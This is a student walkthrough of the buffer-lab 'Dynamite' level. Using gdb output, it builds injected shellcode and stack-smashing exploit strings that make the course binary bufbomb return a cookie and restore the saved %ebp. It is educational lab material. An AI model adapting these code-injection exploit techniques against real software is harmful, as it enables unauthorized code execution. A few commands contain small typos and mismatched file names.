# Level 3: Dynamite	( Hai Dang )

In level 2 (Firecracker),  our preceding attacks have all caused the program to jump
to the code for some other function, which then causes the program to exit. As a result,
it was acceptable to use exploit strings that corrupt the stack, overwriting saved values. 

The most sophisticated form of buffer overflow attack causes the program to execute some
exploit code that changes the program's register/memory state, but makes the program return
to the original calling function. The style of attack describes following steps:

1. Get machine code onto the stack
2. Set the return pointer to the start of this code
3. undo any corruptions made to the stack state.

In particular, in this exercise, we need to supply an exploit string that will cause `getbuf`
to return your cookie back to test, rather than the value 1. We can see in the code for `test`
that will cause the program to go `"Boom!"`. our exploit should set the cookie as the return value,
restore any corrupted state, push the correct return location on the stack, and execute a `ret`
instruction to really return to `test`. 

## Start:

### 1. Similar to previous Level , we need to see what happen in `test` function. 

Let's view the disassembly for `test` function by typing:

```
danghai@babbage:~/buflab-handout$ gdb bufbomb
(gdb) break test
Breakpoint 1 at 0x8048d18
(gdb) run -u danghai
(gdb) disassemble 
```

Assembly code for `test` function:

```asm
Dump of assembler code for function test:
   0x08048d14 <+0>:	push   %ebp
   0x08048d15 <+1>:	mov    %esp,%ebp
   0x08048d17 <+3>:	push   %ebx
=> 0x08048d18 <+4>:	sub    $0x24,%esp
   0x08048d1b <+7>:	call   0x8048b30 <uniqueval>
   0x08048d20 <+12>:	mov    %eax,-0xc(%ebp)
   0x08048d23 <+15>:	call   0x80490ce <getbuf>
   0x08048d28 <+20>:	mov    %eax,%ebx
   0x08048d2a <+22>:	call   0x8048b30 <uniqueval>
   0x08048d2f <+27>:	mov    -0xc(%ebp),%edx
   0x08048d32 <+30>:	cmp    %edx,%eax
   0x08048d34 <+32>:	je     0x8048d44 <test+48>
   0x08048d36 <+34>:	movl   $0x804a0a8,(%esp)
   0x08048d3d <+41>:	call   0x8048940 <puts@plt>
   0x08048d42 <+46>:	jmp    0x8048d7a <test+102>
   0x08048d44 <+48>:	cmp    0x804c1e4,%ebx
   0x08048d4a <+54>:	jne    0x8048d6a <test+86>
   0x08048d4c <+56>:	mov    %ebx,0x4(%esp)
   0x08048d50 <+60>:	movl   $0x8049f6a,(%esp)
   0x08048d57 <+67>:	call   0x80488e0 <printf@plt>
   0x08048d5c <+72>:	movl   $0x3,(%esp)
   0x08048d63 <+79>:	call   0x80490e8 <validate>
   0x08048d68 <+84>:	jmp    0x8048d7a <test+102>
   0x08048d6a <+86>:	mov    %ebx,0x4(%esp)
   0x08048d6e <+90>:	movl   $0x8049f87,(%esp)
   0x08048d75 <+97>:	call   0x80488e0 <printf@plt>
   0x08048d7a <+102>:	add    $0x24,%esp
   0x08048d7d <+105>:	pop    %ebx
   0x08048d7e <+106>:	pop    %ebp
   0x08048d7f <+107>:	ret    
End of assembler dump.
```
### 2. Examining the assembly code, and determine what we should do

Look carefully short assembly code from `test+7` to `test+30`

```asm
   0x08048d1b <+7>:	call   0x8048b30 <uniqueval>
   0x08048d20 <+12>:	mov    %eax,-0xc(%ebp)
   0x08048d23 <+15>:	call   0x80490ce <getbuf>
   0x08048d28 <+20>:	mov    %eax,%ebx
   0x08048d2a <+22>:	call   0x8048b30 <uniqueval>
   0x08048d2f <+27>:	mov    -0xc(%ebp),%edx
   0x08048d32 <+30>:	cmp    %edx,%eax
```
Before calling function `getbuf`, they move data to `%0xebp - 0xC`. 
after calling function `getbuf`, they move return value `%eax register` to 
`%ebx register`. Oh! we need to use buffer overflow attack ( like level 0 -> 2) 
to modify the return address by my coorkie `0x2b9b4cfd`(because it always return 1
). After that, we can seethey move back data from `%0xebp - 0xC` to `%edx register` 
and compare `%edx and %eax`we need to make sure they have the same value after smashing the stack. Therefore, in sum up, we need to do:
 
1. Get machine code onto the stack
2. Set the return pointer to the start of this code
3. undo any corruptions made to the stack state.
  
### 3. Get machine code onto the stack and return pointer to the start of this code

We need to set breakpoint at `test+12` to know address stack before smashing them in `getbuf`
Type command to know information about stack address: 

```
danghai@babbage:~/buflab-handout$ gdb bufbomb
(gdb) break *test+12
Breakpoint 1 at 0x8048d18
(gdb) run -u danghai
(gdb) i r 
```
It give information: 

```asm
eax            0x7dfcc98e	2113718670
ecx            0x7dfcc98e	2113718670
edx            0xf7fa03e4	-134609948
ebx            0x0	0
esp            0x556830d8	0x556830d8 <_reserved+1036504>
ebp            0x55683100	0x55683100 <_reserved+1036544>
esi            0x55686420	1432904736
edi            0xee0	3808
eip            0x8048d20	0x8048d20 <test+12>
eflags         0x212	[ AF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

So, the address stack `%esp` is : `0x556830d8`

Look at assembly code for function `test` we can see:

```asm
   0x08048d23 <+15>:	call   0x80490ce <getbuf>
   0x08048d28 <+20>:	mov    %eax,%ebx
```

Transparently, the address we need to return of this code is `0x08048d28`.

Following this information: write shellcode `asm_Dynamite.s` to exploit it:

```asm
movl $0x2b9b4cfd, %eax
pushl $0x08048d28
ret
```
And then type commands:
```
danghai@babbage:~/uflab-handout$ gcc -m32 -c asm_Dynamite.s
objdump -d asm_Dynamite.o > asm_Dynamite.d
danghai@babbage:~/uflab-handout$ cat asm_Dynamite.d
```

It gives: 

```asm
00000000 <.text>:
   0:	b8 fd 4c 9b 2b       	mov    $0x2b9b4cfd,%eax
   5:	68 28 8d 04 08       	push   $0x8048d28
   a:	c3                   	ret    
```

Now we have hex representation of the assembly instructions so it can be placed in the exploit string:

```
	danghai@babbage:~/buflab-handout$ perl -e 'print "61 "x44,"d8 30 68 55 ","b8 fd 4c 9b 2b 68 28 8d 04 08 c3"' > hex_level3
	danghai@babbage:~/buflab-handout$ ./hex2raw <hex_level3> raw_level3
	danghai@babbage:~/buflab-handout$ ./bufbomb -u danghai < raw_level3
```

!OPss. It is incorrect, result: 

```
Userid: danghai
Cookie: 0x2b9b4cfd
Type string:Ouch!: You caused a segmentation fault!
Better luck next time
```

### 4. Undo any corruptions made to the stack state.

There is something wrong with exploit string ! We need to figure out. Type these command:

danghai@babbage:~/buflab-handout$ gdb bufbomb
(gdb) break *test+27
Breakpoint 1 at 0x8048d2f
(gdb) run -u danghai < raw_level3
(gdb) i r 
```

It gives: 

```asm
eax            0x4a4e1599	1246631321
ecx            0x4a4e1599	1246631321
edx            0xf7fa03e4	-134609948
ebx            0x2b9b4cfd	731598077
esp            0x556830d8	0x556830d8 <_reserved+1036504>
ebp            0x61616161	0x61616161
esi            0x55686420	1432904736
edi            0xee0	3808
eip            0x8048d2f	0x8048d2f <test+27>
eflags         0x212	[ AF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

Look at the value at `%ebp = 0x61616161` register. The base stack pointer %ebp has also
been overwritten with the exploit. We can fix this problem by 2 ways: 

1. Determine where `%ebp` locates in exploit string
2. Modify the shellcode (asm_Dynamited.s)

#### Determine where `%ebp` locates in exploit string

Firstly, we need to figure out the value of `%ebp` by set break at function `test` --> `%ebp = 0x55683100`.

Secondly, filling the exploit string at buffer with string "AA "x4, "BB "x4, "CC "x4.

```
	danghai@babbage:~/buflab-handout$ perl -e 'print "61 "x32,"AA "x4,"BB "x4,"CC "x4,"d8 30 68 55 ","b8 fd 4c 9b 2b 68 28 8d 04 08 c3"' > hex_level3
	danghai@babbage:~/buflab-handout$ ./hex2raw <hex_level3> raw_level3
```

Set the breakpoint at `%test+27`, and see information register: 

```asm
eax            0x65ffcc69	1711262825
ecx            0x65ffcc69	1711262825
edx            0xf7fa03e4	-134609948
ebx            0x2b9b4cfd	731598077
esp            0x556830d8	0x556830d8 <_reserved+1036504>
ebp            0xcccccccc	0xcccccccc
esi            0x55686420	1432904736
edi            0xee0	3808
eip            0x8048d2f	0x8048d2f <test+27>
eflags         0x212	[ AF IF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99

```

Oh! it is overwrite by CC character. Now we change the exploit string and see the result: 

```
	danghai@babbage:~/buflab-handout$ perl -e 'print "61 "x32,"AA "x4,"BB "x4,"00 31 68 55 ","d8 30 68 55 ","b8 fd 4c 9b 2b 68 28 8d 04 08 c3"' > hex_level3
	danghai@babbage:~/buflab-handout$ ./hex2raw <hex_level3> raw_level3
	danghai@babbage:~/buflab-handout$ ./bufbomb -u danghai < raw_level3
```
Woo! We got it: 

```
Userid: danghai
Cookie: 0x2b9b4cfd
Type string:Boom!: getbuf returned 0x2b9b4cfd
VALID
NICE JOB!
```

#### 2. Modify the shellcode (asm_Dynamited.s)

We know we need to change `%ebp = 0x55683100`. We can modify the asm: 

```asm
00000000 <.text>:
   0:	b8 fd 4c 9b 2b       	mov    $0x2b9b4cfd,%eax
   5:	bd 00 31 68 55       	mov    $0x55683100,%ebp
   a:	68 28 8d 04 08       	push   $0x8048d28
   f:	c3 
```
Now we have hex representation of the assembly instructions so it can be placed in the exploit string:

```
	danghai@babbage:~/buflab-handout$ perl -e 'print "61 "x44,"d8 30 68 55 ","b8 fd 4c 9b 2b bd 00 31 68 55 68 28 8d 04 08 c3"' > hex_level
	danghai@babbage:~/buflab-handout$ ./hex2raw <hex_level3> raw_level3
	danghai@babbage:~/buflab-handout$ ./bufbomb -u danghai < raw_level3
```

Woa! We got it again: 

```
Userid: danghai
Cookie: 0x2b9b4cfd
Type string:Boom!: getbuf returned 0x2b9b4cfd
VALID
NICE JOB!
```




